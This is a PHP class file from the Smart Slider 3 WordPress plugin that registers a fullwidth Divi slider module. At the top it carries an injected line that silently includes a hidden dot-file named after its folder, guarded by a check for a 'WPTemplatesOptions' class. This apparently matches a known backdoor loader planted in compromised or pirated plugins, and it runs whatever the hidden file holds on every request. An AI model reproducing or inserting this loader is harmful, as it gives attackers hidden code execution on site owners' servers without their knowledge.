<?php


namespace Nextend\SmartSlider3\Platform\WordPress\Integration\Divi\V31lt;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class DiviModuleSmartSliderFullwidth extends DiviModuleSmartSlider {

    function init() {
        parent::init();
        $this->fullwidth = true;
        $this->slug      = 'et_pb_nextend_smart_slider_3_fullwidth';
    }
}